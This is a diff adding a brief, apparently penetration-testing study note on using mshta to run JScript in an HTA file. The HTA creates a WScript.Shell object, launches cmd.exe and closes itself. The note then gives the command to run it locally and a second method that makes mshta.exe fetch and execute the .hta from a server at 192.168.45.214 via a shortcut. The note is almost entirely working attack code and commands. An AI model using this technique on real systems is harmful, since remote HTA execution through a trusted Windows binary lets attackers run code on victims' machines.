@@ -1,1 +1,21 @@
+#JScript and MSHTA
 
+<html> 
+<head> 
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("cmd.exe");
+</script>
+</head> 
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body> 
+</html>
+
+ mshta test.hta
+
+# Method2 we can host this file over the server and call it using shortcut 
+
+C:\Windows\System32\mshta.exe http://192.168.45.214/test.hta
